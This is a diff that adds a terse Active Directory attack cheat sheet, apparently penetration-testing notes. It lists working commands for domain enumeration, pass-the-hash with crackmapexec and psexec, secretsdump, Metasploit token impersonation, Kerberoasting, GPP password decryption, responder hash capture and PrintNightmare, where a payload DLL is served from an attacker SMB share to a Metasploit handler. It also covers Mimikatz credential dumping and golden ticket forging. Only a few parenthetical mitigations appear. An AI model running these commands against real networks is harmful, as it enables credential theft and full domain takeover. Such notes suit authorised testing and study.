@@ -1,0 +1,116 @@
+# Powersploit's PowerView.ps1 Enumeration
+
+get powerview on a box and run it in powershell
+
+Get-NetDomain
+Get-NetDomainController
+Get-DomainPolicy
+(Get-DomainPolicy)."SPECIFIC POLICY"
+Get-NetUser | select cn
+Get-NetUser | select samaccountname
+Get-UserProperties -Properties logonaccount (identify honeypots)
+Get-NetComputer
+Get-NetComputer -FullData
+Get-NetGroup
+Get-NetGroupMember -GroupName “NAME”
+Get-NetGPO | select displayname, whenchanged 
+Invoke-ShareFinder
+
+# Bloodhound Enumeration
+
+Run neo4j console and login to bloodhound with neo4j password
+
+get SharpHound loaded onto the target device 
+
+ Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.local -ZipFileName file.zip
+
+load .zip file into Bloodhound
+
+# Pass the Hash/ Password
+
+crackmapexec smb IPPADDRESS/RANGE -u USER -H HASH --local
+crackmapexec smb IPPADDRESS/RANGE -u USER -d DOMAIN.local -p PASSWORD  
+		(USE Single Quotes for passwords with symbols
+secretsdump.py DOMAIN/USER:PASSWORD@IPADDRESS (Use to get all system user info
+
+use psexec to abuse found hashes
+psexec.py “USERNAME”@IPADDRESS -hashes NTLM:HASH
+
+# Token Impersonation
+
+msfconsole
+use exploit/windows/smb/psexec
+set RHOST to victim
+set smbdomain to domain.local
+set smbuser to captured credentials
+set smbpass to captured credentials
+set target to native upload
+
+load incognito 
+
+add_user
+list_tokens -u 
+impersonate_tokens domain\\user
+
+tokens only work until reboot 
+(limit token creation permission, local admin restriction, account tiering)
+
+# Kerberoasting
+
+python GetUserSPNs.py domain.local/user:password -dc-ip IPADDRESS -request
+
+Use HASHCAT to break password (Password Cracking section)
+
+(Use strong passwords and least privilege)
+
+# GPP Attack 
+
+MS14-025 in SMB enabled machines, Group.xml file is important
+prompt off
+recurse on 
+mget * 
+Groups.xml file contains hashes and usernames
+gpp-decrypt HASH
+
+or MSF > use auxillary/smb_enum_gpp
+
+use PSEXEC to login with credentials or kerberoasting to get domain credentials
+
+# URL File Attacks
+
+from an open file share or compromised user account
+
+upload a .url file (ex on Desktop) to the share and run responder to listen for hashes
+
+# PrintNightmare
+
+create a dll to abuse vulnerability with MSFVenom
+share dll with smbserver.py share 'PATH/TO/FILE -smb2support
+start msfconsole > use /multi/handler and set payload to one used in MSFVnom
+use Cube0x0 github exploit and connect to attacker share
+
+# MIMIKatz
+Get MIMIKatz onto the compromised machine
+
+execute mimikatz.exe
+
+privilege::debug  >> “20” ok is what we want to see
+
+sekurlsa::logonpasswords  >> Shows all users logged on since last reboot and computer NTLM Hashes
+
+lsadump::sam (/patch)  >> Show all user passwords on a system
+
+lsadump::lsa /patch  >>  DUMP Local Security Authority (creates logons for local computer)
+
+# Golden Ticket 
+
+using mimikatz 
+run privilege::debug
+run lsadump::lsa /inject /name:krbtgt
+
+get SID of domain
+get ntlm hash of TGS account
+
+ kerberos::golden /User:Administrator /domain:DOMAIN.local /sid:COPIEDSID /krbtgt:COPIEDHASH /id:500 /ptt
+ 
+ misc::cmd
